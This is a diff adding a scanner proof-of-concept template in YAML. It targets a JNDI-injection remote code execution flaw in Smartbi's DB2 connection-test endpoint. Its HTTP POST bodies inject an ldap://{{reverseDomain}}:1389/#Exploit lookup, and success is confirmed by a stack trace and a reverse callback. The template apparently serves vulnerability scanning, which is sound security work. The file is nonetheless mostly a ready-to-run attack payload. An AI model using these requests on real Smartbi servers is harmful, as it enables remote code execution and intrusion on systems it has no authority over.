@@ -1,0 +1,54 @@
+name: poc-yaml-smartbi-db2-biconfigservice-rce
+binding: 807d6515-a393-4721-a19a-a8ce8fae96a1
+manual: true
+detail:
+    author: secking
+    links:
+        - https://www.smartbi.com.cn/patchinfo
+    vulnerability:
+        id: CT-529855
+        level: critical
+    description: smartbi 小于v10.5.8(20221125)版本（之前版本打patch.2022-11-22补丁也不行）存在db2命令执行漏洞
+    info: 需要配置管理员权限利用
+transport: http
+set:
+    reverse: newReverse()
+    reverseDomain: reverse.domain
+rules:
+    r1:
+        request:
+            cache: false
+            method: POST
+            path: /smartbi/vision/RMIServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+            body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+        expression: response.status == 200 && response.body.ibcontains(bytes("stackTrace")) && !response.body.ibcontains(bytes("CLIENT_USER_NOT_LOGIN")) && !response.body.ibcontains(bytes("会存在RCE的安全漏洞"))
+    r2:
+        request:
+            cache: false
+            method: POST
+            path: /smartbi/vision/RMIServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+            body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{reverseDomain}}:1389/#Exploit","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+        expression: reverse.wait(5)
+    r3:
+        request:
+            cache: false
+            method: POST
+            path: /vision/RMIServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+            body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688",":clientRerouteServerListJNDIName=","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+        expression: response.status == 200 && response.body.ibcontains(bytes("stackTrace")) && !response.body.ibcontains(bytes("CLIENT_USER_NOT_LOGIN")) && !response.body.ibcontains(bytes("会存在RCE的安全漏洞"))
+    r4:
+        request:
+            cache: false
+            method: POST
+            path: /vision/RMIServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+            body: className=BIConfigService&methodName=testConnection&params=["DB2_V9","","localhost:6688","BLUDB:clientRerouteServerListJNDIName=ldap://{{reverseDomain}}:1389/#Exploit","admin","",{"dameng6":false,"secret-key":null,"secret-key-encrypt-type":"0","token-timeout":"60","require-password":"false"}]
+        expression: reverse.wait(5)
+expression: r1() && r2() || r3() && r4()
